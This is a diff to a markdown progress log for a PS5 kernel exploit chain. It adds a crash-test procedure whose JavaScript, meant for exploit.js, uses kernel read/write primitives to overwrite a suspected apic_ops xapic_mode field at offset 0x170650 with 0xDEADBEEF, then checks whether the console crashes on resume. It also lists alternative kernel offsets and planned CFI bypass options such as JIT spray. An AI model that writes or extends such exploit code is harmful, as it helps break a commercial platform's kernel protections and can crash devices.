@@ -640,6 +640,10 @@ COMPLETED:
 │   └── xapic_mode at struct offset 0x10 (position [2])
 └── ✅ Document full structure with addresses
 
+IN PROGRESS:
+└── 🔄 Crash test to verify offset
+    └── Write garbage to xapic_mode, trigger rest mode, verify crash on resume
+
 High Priority (REMAINING):
 ├── Identify CFI bypass candidates
 │   └── Options: JIT spray, race condition, or find unchecked call
@@ -659,6 +663,55 @@ Integration:
 ├── Implement APIC overwrite in Byepervisor
 ├── Add CFI bypass code
 └── Test full exploit chain
+```
+
+### Crash Test Procedure (Offset Verification)
+
+**Purpose:** Confirm that 0x170650 is actually apic_ops by corrupting xapic_mode and
+observing if the PS5 crashes during resume from rest mode.
+
+**Code to add to exploit.js (before `await load_local_elf("elfldr.elf");`):**
+
+```javascript
+///////////////////////////////////////////////////////////////////////
+// APIC CRASH TEST - Verify apic_ops offset
+///////////////////////////////////////////////////////////////////////
+
+let apic_ops = kdata_base.add32(0x170650);
+let xapic_mode_ptr = apic_ops.add32(0x10);
+
+let original_xapic_mode = await kernel_read8(xapic_mode_ptr);
+debug_log("[APIC TEST] xapic_mode_ptr = 0x" + xapic_mode_ptr);
+debug_log("[APIC TEST] original value = 0x" + original_xapic_mode);
+
+let do_apic_test = confirm("APIC Crash Test:\n\nxapic_mode @ 0x" + xapic_mode_ptr +
+                            "\nCurrent value: 0x" + original_xapic_mode +
+                            "\n\nThis will write 0xDEADBEEF and you need to put PS5 in rest mode.\n" +
+                            "If PS5 crashes on RESUME, the offset is CORRECT.\n\nProceed?");
+
+if (do_apic_test) {
+    debug_log("[APIC TEST] Writing 0xDEADBEEF to xapic_mode...");
+    await kernel_write8(xapic_mode_ptr, new int64(0xDEADBEEF, 0));
+
+    let verify = await kernel_read8(xapic_mode_ptr);
+    debug_log("[APIC TEST] Verify: 0x" + verify);
+
+    alert("APIC TEST: Written!\n\nNow manually put PS5 in REST MODE.\n\n" +
+          "If it CRASHES on resume = offset is CORRECT!\n" +
+          "If it resumes normally = offset is WRONG.");
+}
+```
+
+**Expected Results:**
+- **PS5 crashes on resume**: Offset is CORRECT - xapic_mode is called during APIC reinit
+- **PS5 resumes normally**: Offset is WRONG - need to test other candidates
+
+**Other candidates to try if 0x170650 fails:**
+```
+0x28B7F8  - 28 pointers
+0x27ED60  - 27 pointers
+0x170510  - 27 pointers
+0x16EF20  - 27 pointers
 ```
 
 ---
